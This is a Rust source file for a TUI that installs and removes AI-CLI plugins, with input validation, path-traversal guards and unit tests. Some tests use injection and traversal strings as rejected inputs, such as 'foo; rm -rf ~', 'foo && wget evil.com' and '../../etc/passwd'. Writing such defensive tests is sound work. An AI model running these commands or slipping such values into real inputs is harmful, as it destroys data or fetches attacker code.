//! Install/remove dispatch for each ecosystem CLI.
//!
//! Delegates to the appropriate CLI (`claude`, `gemini`) or file-based
//! mechanism (Codex). All subprocess output is ANSI-stripped before being
//! forwarded to the TUI event loop.

use std::path::{Component, Path, PathBuf};
use std::time::Instant;

use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::sync::mpsc::Sender;

use crate::tui::events::AppEvent;
use crate::tui::state::Ecosystem;

// ── PluginIdentifier ──────────────────────────────────────────────────────────

/// Validated plugin identifier — prevents command injection at the CLI boundary.
///
/// Accepts: `a-z A-Z 0-9 . _ / -` (max 128 chars).
/// Rejects: semicolons, ampersands, spaces, unicode, anything else.
#[derive(Debug, Clone)]
pub struct PluginIdentifier(String);

impl PluginIdentifier {
    /// Validate and wrap a raw string.
    pub fn new(s: &str) -> Result<Self, String> {
        if s.is_empty() {
            return Err("plugin identifier must not be empty".into());
        }
        if s.len() > 128 {
            return Err(format!(
                "plugin identifier too long ({} chars, max 128)",
                s.len()
            ));
        }
        if !s
            .chars()
            .all(|c| matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | '.' | '_' | '/' | '-'))
        {
            return Err(format!(
                "plugin identifier contains disallowed characters: {s:?}"
            ));
        }
        Ok(Self(s.to_string()))
    }

    /// Return the validated identifier as a string slice.
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Display for PluginIdentifier {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

// ── commit SHA validation ─────────────────────────────────────────────────────

/// Validate a commit SHA before using it as a `--ref` argument.
///
/// Accepts: lowercase hex digits only, length 7–40.
/// Rejects: anything else (path separators, shell metacharacters, `ref:` lines,
/// uppercase, unicode, empty strings, strings longer than 40 chars).
///
/// Returns `Err` with an `invalid_param` message suitable for surfacing to the user.
pub fn validate_commit_sha(sha: &str) -> Result<(), String> {
    if sha.len() < 7 {
        return Err(format!(
            "invalid_param: commit SHA too short ({} chars, min 7): {sha:?}",
            sha.len()
        ));
    }
    if sha.len() > 40 {
        return Err(format!(
            "invalid_param: commit SHA too long ({} chars, max 40): {sha:?}",
            sha.len()
        ));
    }
    if !sha.chars().all(|c| matches!(c, '0'..='9' | 'a'..='f')) {
        return Err(format!(
            "invalid_param: commit SHA contains non-hex characters: {sha:?}"
        ));
    }
    Ok(())
}

// ── PluginRef ─────────────────────────────────────────────────────────────────

/// Reference to a plugin being installed or removed.
pub struct PluginRef<'a> {
    /// Marketplace or owner identifier (e.g. `"owner/repo"` or a marketplace name).
    pub marketplace: &'a str,
    /// Plugin name within the marketplace.
    pub plugin: &'a str,
    /// Requested version string (used by Codex file-based install).
    pub version: Option<&'a str>,
    /// Git ref / commit SHA — passed as `--ref` to Claude Code and Gemini CLIs.
    pub commit_sha: Option<&'a str>,
}

impl PluginRef<'_> {
    /// Canonical `marketplace/plugin` form used in CLI arguments and progress labels.
    fn full_id(&self) -> String {
        format!("{}/{}", self.marketplace, self.plugin)
    }
}

// ── Public surface ────────────────────────────────────────────────────────────

/// Install a plugin for the given ecosystem.
///
/// Streams progress lines via `tx` as [`AppEvent::ProgressLine`].
/// Sends [`AppEvent::TaskDone`] or [`AppEvent::TaskError`] on completion.
/// All subprocess output is passed through `strip_ansi_escapes::strip_str()`
/// before being sent.
pub async fn install(
    eco: Ecosystem,
    plugin: &PluginRef<'_>,
    tx: Sender<AppEvent>,
) -> anyhow::Result<()> {
    let started = Instant::now();
    let plugin_id = plugin.full_id();

    let result = match eco {
        Ecosystem::ClaudeCode => install_claude(plugin, &plugin_id, &tx).await,
        Ecosystem::Codex => install_codex(plugin, &plugin_id, &tx).await,
        Ecosystem::Gemini => install_gemini(plugin, &plugin_id, &tx).await,
    };

    let elapsed = started.elapsed();

    match &result {
        Ok(()) => {
            tracing::info!(
                surface = "tui",
                service = eco.as_str(),
                action = "install",
                plugin = %plugin_id,
                elapsed_ms = %elapsed.as_millis(),
            );
            let _unused = tx
                .send(AppEvent::TaskDone {
                    kind: format!("install:{plugin_id}"),
                })
                .await;
        }
        Err(e) => {
            tracing::warn!(
                surface = "tui",
                service = eco.as_str(),
                action = "install",
                plugin = %plugin_id,
                elapsed_ms = %elapsed.as_millis(),
                error = %e,
            );
            let _unused = tx
                .send(AppEvent::TaskError {
                    kind: format!("install:{plugin_id}"),
                    message: e.to_string(),
                })
                .await;
        }
    }

    result
}

/// Remove a plugin.
///
/// `confirm` **must** be `true`; callers are responsible for showing a
/// destructive-confirmation modal before passing `true` here. Passing
/// `false` returns `Err` immediately without spawning any process.
pub async fn remove(
    eco: Ecosystem,
    plugin_id: PluginIdentifier,
    confirm: bool,
    tx: Sender<AppEvent>,
) -> anyhow::Result<()> {
    if !confirm {
        return Err(anyhow::anyhow!(
            "removal of {plugin_id} requires explicit confirmation"
        ));
    }

    let started = Instant::now();
    let id_str = plugin_id.as_str().to_string();

    let result = match eco {
        Ecosystem::ClaudeCode => remove_claude(&plugin_id, &tx).await,
        Ecosystem::Codex => remove_codex(&plugin_id, &tx).await,
        Ecosystem::Gemini => remove_gemini(&plugin_id, &tx).await,
    };

    let elapsed = started.elapsed();

    match &result {
        Ok(()) => {
            tracing::info!(
                surface = "tui",
                service = eco.as_str(),
                action = "remove",
                plugin = %id_str,
                elapsed_ms = %elapsed.as_millis(),
            );
            let _unused = tx
                .send(AppEvent::TaskDone {
                    kind: format!("remove:{id_str}"),
                })
                .await;
        }
        Err(e) => {
            tracing::warn!(
                surface = "tui",
                service = eco.as_str(),
                action = "remove",
                plugin = %id_str,
                elapsed_ms = %elapsed.as_millis(),
                error = %e,
            );
            let _unused = tx
                .send(AppEvent::TaskError {
                    kind: format!("remove:{id_str}"),
                    message: e.to_string(),
                })
                .await;
        }
    }

    result
}

// ── Claude Code ───────────────────────────────────────────────────────────────

async fn install_claude(
    plugin: &PluginRef<'_>,
    plugin_id: &str,
    tx: &Sender<AppEvent>,
) -> anyhow::Result<()> {
    let mut args = vec!["plugin", "install", plugin_id];
    let ref_val;
    if let Some(sha) = plugin.commit_sha {
        validate_commit_sha(sha)
            .map_err(|e| anyhow::anyhow!("{e}"))?;
        ref_val = sha.to_string();
        args.push("--ref");
        args.push(&ref_val);
    }

    run_subprocess("claude", &args, plugin_id, tx).await
}

async fn remove_claude(id: &PluginIdentifier, tx: &Sender<AppEvent>) -> anyhow::Result<()> {
    run_subprocess(
        "claude",
        &["plugin", "uninstall", id.as_str()],
        id.as_str(),
        tx,
    )
    .await
}

// ── Codex (file-based) ────────────────────────────────────────────────────────

fn home_dir() -> PathBuf {
    std::env::var_os("HOME").map_or_else(|| PathBuf::from("/root"), PathBuf::from)
}

/// Join `base` with an untrusted relative path, rejecting any `..` components.
/// Also verifies the resolved path starts with `base` (belt-and-suspenders).
pub fn safe_join(base: &Path, untrusted: &str) -> Result<PathBuf, String> {
    let joined = base.join(untrusted);
    for comp in joined.components() {
        if matches!(comp, Component::ParentDir) {
            return Err("path traversal detected".into());
        }
    }
    if !joined.starts_with(base) {
        return Err("resolved path escapes base directory".into());
    }
    Ok(joined)
}

async fn install_codex(
    plugin: &PluginRef<'_>,
    plugin_id: &str,
    tx: &Sender<AppEvent>,
) -> anyhow::Result<()> {
    let version = plugin.version.unwrap_or("latest");
    let cache_base = home_dir().join(".codex/plugins/cache");

    // Build destination path safely.
    let sub = format!("{}/{}/{}", plugin.marketplace, plugin.plugin, version);
    let dest = safe_join(&cache_base, &sub)
        .map_err(|e| anyhow::anyhow!("unsafe install path for {plugin_id}: {e}"))?;

    // Emit progress.
    let _unused = tx
        .send(AppEvent::ProgressLine {
            plugin_id: plugin_id.to_string(),
            line: format!("Creating {}", dest.display()),
        })
        .await;

    tokio::fs::create_dir_all(&dest)
        .await
        .map_err(|e| anyhow::anyhow!("failed to create cache dir {}: {e}", dest.display()))?;

    // Update ~/.codex/config.toml — add a [plugin_id] section if absent.
    let config_path = home_dir().join(".codex/config.toml");
    codex_config_add(plugin_id, &dest, &config_path).await?;

    let _unused = tx
        .send(AppEvent::ProgressLine {
            plugin_id: plugin_id.to_string(),
            line: format!("Registered {plugin_id} in ~/.codex/config.toml"),
        })
        .await;

    Ok(())
}

async fn remove_codex(id: &PluginIdentifier, tx: &Sender<AppEvent>) -> anyhow::Result<()> {
    let cache_base = home_dir().join(".codex/plugins/cache");
    let target = safe_join(&cache_base, id.as_str())
        .map_err(|e| anyhow::anyhow!("unsafe remove path for {id}: {e}"))?;

    if target.exists() {
        let _unused = tx
            .send(AppEvent::ProgressLine {
                plugin_id: id.as_str().to_string(),
                line: format!("Removing {}", target.display()),
            })
            .await;
        tokio::fs::remove_dir_all(&target)
            .await
            .map_err(|e| anyhow::anyhow!("failed to remove {}: {e}", target.display()))?;
    }

    let config_path = home_dir().join(".codex/config.toml");
    codex_config_remove(id.as_str(), &config_path).await?;

    let _unused = tx
        .send(AppEvent::ProgressLine {
            plugin_id: id.as_str().to_string(),
            line: format!("Removed {} from ~/.codex/config.toml", id.as_str()),
        })
        .await;

    Ok(())
}

/// Add a `[<section>]` entry to `~/.codex/config.toml`.
/// Creates the file if absent. Does not overwrite an existing section.
async fn codex_config_add(section: &str, dest: &Path, config_path: &Path) -> anyhow::Result<()> {
    let existing = if config_path.exists() {
        tokio::fs::read_to_string(config_path)
            .await
            .unwrap_or_default()
    } else {
        String::new()
    };

    // Only add if section not already present.
    let header = format!("[{section}]");
    if existing.contains(&header) {
        return Ok(());
    }

    let addition = format!("\n[{section}]\npath = \"{}\"\n", dest.display());
    let updated = format!("{existing}{addition}");

    if let Some(parent) = config_path.parent() {
        tokio::fs::create_dir_all(parent).await.ok();
    }
    tokio::fs::write(config_path, updated)
        .await
        .map_err(|e| anyhow::anyhow!("failed to write {}: {e}", config_path.display()))
}

/// Remove a `[<section>]` block from `~/.codex/config.toml`.
async fn codex_config_remove(section: &str, config_path: &Path) -> anyhow::Result<()> {
    if !config_path.exists() {
        return Ok(());
    }
    let content = tokio::fs::read_to_string(config_path)
        .await
        .map_err(|e| anyhow::anyhow!("failed to read {}: {e}", config_path.display()))?;

    let header = format!("[{section}]");
    if !content.contains(&header) {
        return Ok(());
    }

    // Remove lines from [section] until the next [section] or EOF.
    let mut result = String::with_capacity(content.len());
    let mut in_section = false;
    for line in content.lines() {
        if line.trim() == header {
            in_section = true;
            continue;
        }
        if in_section && line.starts_with('[') {
            in_section = false;
        }
        if !in_section {
            result.push_str(line);
            result.push('\n');
        }
    }

    tokio::fs::write(config_path, result)
        .await
        .map_err(|e| anyhow::anyhow!("failed to write {}: {e}", config_path.display()))
}

// ── Gemini CLI ────────────────────────────────────────────────────────────────

async fn install_gemini(
    plugin: &PluginRef<'_>,
    plugin_id: &str,
    tx: &Sender<AppEvent>,
) -> anyhow::Result<()> {
    let github_ref = format!("github.com/{plugin_id}");
    let mut args = vec!["extensions", "install", github_ref.as_str()];
    let ref_val;
    if let Some(sha) = plugin.commit_sha {
        validate_commit_sha(sha)
            .map_err(|e| anyhow::anyhow!("{e}"))?;
        ref_val = sha.to_string();
        args.push("--ref");
        args.push(&ref_val);
    }

    run_subprocess("gemini", &args, plugin_id, tx).await?;

    // Toast: restart required.
    let _unused = tx
        .send(AppEvent::ProgressLine {
            plugin_id: plugin_id.to_string(),
            line: "Gemini CLI restart required for extension to take effect.".into(),
        })
        .await;

    Ok(())
}

async fn remove_gemini(id: &PluginIdentifier, tx: &Sender<AppEvent>) -> anyhow::Result<()> {
    run_subprocess(
        "gemini",
        &["extensions", "uninstall", id.as_str()],
        id.as_str(),
        tx,
    )
    .await
}

// ── Subprocess runner ─────────────────────────────────────────────────────────

/// Spawn a subprocess, stream its stdout + stderr as `ProgressLine` events,
/// and wait up to 120 s. Kills the child on timeout.
async fn run_subprocess(
    program: &str,
    args: &[&str],
    plugin_id: &str,
    tx: &Sender<AppEvent>,
) -> anyhow::Result<()> {
    use std::process::Stdio;
    use tokio::time::{Duration, timeout};

    let mut child = tokio::process::Command::new(program)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| anyhow::anyhow!("failed to spawn `{program}`: {e}"))?;

    #[allow(clippy::expect_used)]
    let stdout = child.stdout.take().expect("stdout piped");
    #[allow(clippy::expect_used)]
    let stderr = child.stderr.take().expect("stderr piped");

    let pid = plugin_id.to_string();
    let tx_out = tx.clone();
    let tx_err = tx.clone();

    // Stream stdout.
    let pid_out = pid.clone();
    let stdout_task = tokio::spawn(async move {
        let mut lines = BufReader::new(stdout).lines();
        while let Ok(Some(line)) = lines.next_line().await {
            let clean = strip_ansi_escapes::strip_str(&line);
            let _unused = tx_out
                .send(AppEvent::ProgressLine {
                    plugin_id: pid_out.clone(),
                    line: clean,
                })
                .await;
        }
    });

    // Stream stderr.
    let stderr_task = tokio::spawn(async move {
        let mut lines = BufReader::new(stderr).lines();
        while let Ok(Some(line)) = lines.next_line().await {
            let clean = strip_ansi_escapes::strip_str(&line);
            let _unused = tx_err
                .send(AppEvent::ProgressLine {
                    plugin_id: pid.clone(),
                    line: clean,
                })
                .await;
        }
    });

    let wait_result = timeout(Duration::from_secs(120), child.wait()).await;

    // Ensure streaming tasks finish.
    drop(stdout_task.await);
    drop(stderr_task.await);

    match wait_result {
        Err(_) => {
            // Timeout — child.kill() is safe even after kill_on_drop.
            child.kill().await.ok();
            Err(anyhow::anyhow!(
                "`{program}` timed out after 120 s for plugin {plugin_id}"
            ))
        }
        Ok(Err(e)) => Err(anyhow::anyhow!("`{program}` wait error: {e}")),
        Ok(Ok(status)) => {
            if status.success() {
                Ok(())
            } else {
                Err(anyhow::anyhow!(
                    "`{program}` exited with {status} for plugin {plugin_id}"
                ))
            }
        }
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── PluginIdentifier ──────────────────────────────────────────────────────

    #[test]
    fn identifier_rejects_semicolon_injection() {
        let result = PluginIdentifier::new("foo; rm -rf ~");
        assert!(result.is_err(), "semicolon injection must be rejected");
    }

    #[test]
    fn identifier_rejects_ampersand_injection() {
        let result = PluginIdentifier::new("foo && wget evil.com");
        assert!(result.is_err(), "ampersand injection must be rejected");
    }

    #[test]
    fn identifier_rejects_unicode() {
        let result = PluginIdentifier::new("plügin");
        assert!(result.is_err(), "unicode must be rejected");
    }

    #[test]
    fn identifier_accepts_valid() {
        let result = PluginIdentifier::new("valid-plugin_1.0");
        assert!(result.is_ok(), "valid identifier must be accepted");
    }

    #[test]
    fn identifier_rejects_too_long() {
        let long = "a".repeat(129);
        assert!(
            PluginIdentifier::new(&long).is_err(),
            "129-char identifier must be rejected"
        );
    }

    #[test]
    fn identifier_accepts_max_length() {
        let max = "a".repeat(128);
        assert!(
            PluginIdentifier::new(&max).is_ok(),
            "128-char identifier must be accepted"
        );
    }

    // ── Path traversal ────────────────────────────────────────────────────────

    #[test]
    fn safe_join_rejects_traversal() {
        let base = PathBuf::from("/home/user/.codex/plugins/cache");
        let result = safe_join(&base, "../../../etc/cron.d/evil");
        assert!(result.is_err(), "path traversal must be rejected");
    }

    #[test]
    fn safe_join_accepts_valid() {
        let base = PathBuf::from("/home/user/.codex/plugins/cache");
        let result = safe_join(&base, "owner/repo/1.0.0");
        assert!(result.is_ok(), "valid sub-path must be accepted");
        assert!(result.unwrap().starts_with(&base));
    }

    // ── Ecosystem match exhaustiveness ────────────────────────────────────────

    #[test]
    fn ecosystem_dispatch_exhaustive() {
        // If any Ecosystem variant is added without updating the match arms in
        // `install` / `remove`, this test will fail to compile.
        for eco in Ecosystem::ALL {
            let _ = match eco {
                Ecosystem::ClaudeCode => "claude-code",
                Ecosystem::Codex => "codex",
                Ecosystem::Gemini => "gemini",
            };
        }
    }

    // ── ANSI stripping ────────────────────────────────────────────────────────

    #[test]
    fn ansi_strip_removes_escape_sequences() {
        let raw = "\x1b[32mInstalling...\x1b[0m";
        let clean = strip_ansi_escapes::strip_str(raw);
        assert_eq!(clean, "Installing...");
    }

    // ── Destructive guard ─────────────────────────────────────────────────────

    #[tokio::test]
    async fn remove_without_confirm_returns_err() {
        let (tx, _rx) = tokio::sync::mpsc::channel(8);
        let id = PluginIdentifier::new("some-plugin").unwrap();
        let result = remove(Ecosystem::ClaudeCode, id, false, tx).await;
        assert!(result.is_err(), "remove without confirm must return Err");
    }

    // ── validate_commit_sha ───────────────────────────────────────────────────

    #[test]
    fn valid_full_sha_passes() {
        // Standard 40-char lowercase hex SHA
        assert!(validate_commit_sha("a3f1c2e4b5d6a7e8f9012345678901234567890a").is_ok());
    }

    #[test]
    fn valid_short_sha_passes() {
        // 7-char abbreviated SHA (minimum accepted length)
        assert!(validate_commit_sha("abc1234").is_ok());
    }

    #[test]
    fn valid_mid_length_sha_passes() {
        assert!(validate_commit_sha("deadbeefcafe123").is_ok());
    }

    #[test]
    fn non_hex_chars_return_invalid_param() {
        // Shell metacharacter injection attempt
        let err = validate_commit_sha("abc1234; rm -rf /").unwrap_err();
        assert!(err.contains("invalid_param"), "expected invalid_param, got: {err}");
        assert!(err.contains("non-hex"), "expected non-hex message, got: {err}");
    }

    #[test]
    fn path_traversal_in_sha_rejected() {
        let err = validate_commit_sha("../../etc/passwd").unwrap_err();
        assert!(err.contains("invalid_param"), "expected invalid_param, got: {err}");
    }

    #[test]
    fn symbolic_ref_line_rejected() {
        // .git/HEAD often contains "ref: refs/heads/main"
        let err = validate_commit_sha("ref: refs/heads/main").unwrap_err();
        assert!(err.contains("invalid_param"), "expected invalid_param, got: {err}");
    }

    #[test]
    fn uppercase_hex_rejected() {
        // Git SHAs are lowercase; uppercase should be rejected
        let err = validate_commit_sha("ABCDEF1234567").unwrap_err();
        assert!(err.contains("invalid_param"), "expected invalid_param, got: {err}");
    }

    #[test]
    fn empty_string_rejected() {
        let err = validate_commit_sha("").unwrap_err();
        assert!(err.contains("invalid_param"), "expected invalid_param, got: {err}");
        assert!(err.contains("too short"), "expected too short message, got: {err}");
    }

    #[test]
    fn too_short_sha_rejected() {
        // 6 chars — one below minimum
        let err = validate_commit_sha("abc123").unwrap_err();
        assert!(err.contains("invalid_param"), "expected invalid_param, got: {err}");
        assert!(err.contains("too short"), "expected too short message, got: {err}");
    }

    #[test]
    fn too_long_sha_rejected() {
        // 41 chars — one above maximum
        let err = validate_commit_sha("a3f1c2e4b5d6a7e8f9012345678901234567890ab").unwrap_err();
        assert!(err.contains("invalid_param"), "expected invalid_param, got: {err}");
        assert!(err.contains("too long"), "expected too long message, got: {err}");
    }
}
